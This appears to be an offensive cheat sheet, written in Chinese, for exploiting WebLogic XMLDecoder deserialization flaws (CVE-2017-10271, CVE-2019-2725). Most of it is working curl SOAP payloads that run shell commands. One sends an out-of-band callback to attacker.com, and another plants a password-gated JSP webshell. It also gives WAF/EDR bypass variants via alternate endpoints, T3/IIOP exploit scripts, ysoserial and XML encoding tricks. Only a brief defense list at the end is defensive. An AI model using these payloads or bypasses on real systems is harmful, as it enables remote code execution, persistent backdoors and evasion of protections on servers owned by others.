nmap -sV -p 7001 --script weblogic-t3-info target
```
**语法解析：**
- `/wls-wsat/CoordinatorPortType` — WebLogic WLS-WSAT组件端点，CVE-2017-10271利用点 _value_
- `/_async/AsyncResponseService` — WebLogic异步通信服务端点，CVE-2019-2725利用点 _value_
- `weblogic-t3-info` — Nmap脚本检测T3协议信息 _value_

**CVE-2017-10271 XMLDecoder RCE**
> 通过SOAP请求中的WorkContext注入XMLDecoder反序列化payload实现命令执行
_platform: linux_
```
curl -v "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/test_rce.txt</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```
**语法解析：**
- `soapenv:Envelope` — SOAP消息的根元素 _value_
- `work:WorkContext` — WebLogic工作上下文，XMLDecoder解析入口 _value_
- `java.beans.XMLDecoder` — Java XML反序列化器，漏洞的核心组件 _value_
- `java.lang.ProcessBuilder` — 用于创建操作系统进程执行命令 _value_
- `void method="start"` — 调用ProcessBuilder.start()执行构造的命令 _command_

**CVE-2019-2725 反序列化RCE**
> 利用_async端点的反序列化漏洞执行外带验证(OOB)
_platform: linux_
```
curl -v "http://target:7001/_async/AsyncResponseService"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>curl http://attacker.com/callback?rce=success</string></void>
        </array>
        <void method="start"/>
      </void>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'
```
**语法解析：**
- `/_async/AsyncResponseService` — 异步服务端点，CVE-2019-2725的攻击入口 _value_
- `wsa:Action` — WS-Addressing Action头，触发异步处理 _value_
- `curl http://attacker.com/callback` — 使用curl外带验证命令执行结果 _command_

**写入Webshell获取持久权限**
> 利用XMLDecoder的PrintWriter写入JSP webshell到WebLogic部署目录
_platform: linux_
```
# 通过XMLDecoder写入JSP Webshell
curl "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.io.PrintWriter">
          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
          <void method="println">
            <string><![CDATA[<%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>
          </void>
          <void method="close"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# 验证Webshell
curl "http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id"
```
**语法解析：**
- `java.io.PrintWriter` — 利用PrintWriter类写入文件 _value_
- `servers/AdminServer/tmp/_WL_internal/...` — WebLogic内部Web应用部署路径 _value_
- `CDATA` — XML CDATA区段，避免JSP代码被XML解析器处理 _value_
- `/bea_wls_internal/test.jsp` — Webshell的访问URL路径 _value_

**WAF/EDR 绕过变体：**

**备用反序列化端点**
> 尝试WebLogic WLS-WSAT组件的多个不同SOAP端点，部分端点可能未被WAF规则覆盖
```
# 尝试不同的XMLDecoder入口
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType
```
**语法解析：**
- `# 尝试不同的XMLDecoder入口` — 主要命令 _command_
- `...` — 共6行 _value_

**T3/IIOP协议绕过HTTP层WAF**
> 使用T3或IIOP协议发送反序列化payload，绕过仅检测HTTP流量的WAF
```
# T3协议利用（绕过HTTP层WAF）
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP协议利用
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# 使用ysoserial生成T3 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.py target 7001
```
**语法解析：**
- `# T3协议利用（绕过HTTP层WAF）` — 主要命令 _command_
- `...` — 共6行 _value_

**XML编码混淆绕过**
> 通过XML编码（UTF-16/CDATA/实体编码）混淆payload内容绕过基于内容匹配的WAF
```
<!-- UTF-16编码绕过 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA包裹关键字 -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```
**语法解析：**
- `<!-- UTF-16编码绕过 -->
` — XML内容 _value_
- `<?xml version="1.0" encoding="UTF-16"?>` — XML声明/实体定义 _tag_
- `

<!-- CDATA包裹关键字 -->
<java>
  <object class="java.lang.Proc` — XML内容 _value_


**概述：** WebLogic XMLDecoder反序列化是一系列严重的RCE漏洞(CVE-2017-3506/CVE-2017-10271/CVE-2019-2725)，攻击者通过向WLS-WSAT或AsyncResponseService端点发送精心构造的SOAP XML请求，利用XMLDecoder对WorkContext的反序列化过程执行任意Java代码，从而实现远程命令执行。

**漏洞原理：** WebLogic的WLS-WSAT和异步通信服务在处理SOAP请求时，使用XMLDecoder解析WorkContext中的XML数据。由于XMLDecoder可以实例化任意Java类并调用其方法，攻击者可以构造恶意XML来创建ProcessBuilder或Runtime实例执行操作系统命令。

**利用方法：** 利用流程：1) 探测目标WebLogic版本和开放端点(/wls-wsat/, /_async/) 2) 构造SOAP XML请求，在WorkContext中嵌入XMLDecoder payload 3) 利用ProcessBuilder执行系统命令验证RCE 4) 通过PrintWriter写入Webshell获取持久权限 5) 利用Webshell执行后续操作

**防御措施：** 1) 升级到最新补丁版本 2) 删除或限制/wls-wsat/和/_async/端点的访问 3) 使用WAF过滤SOAP请求中的恶意XML 4) 限制WebLogic运行权限 5) 监控异常的SOAP请求和文件写入操作

---
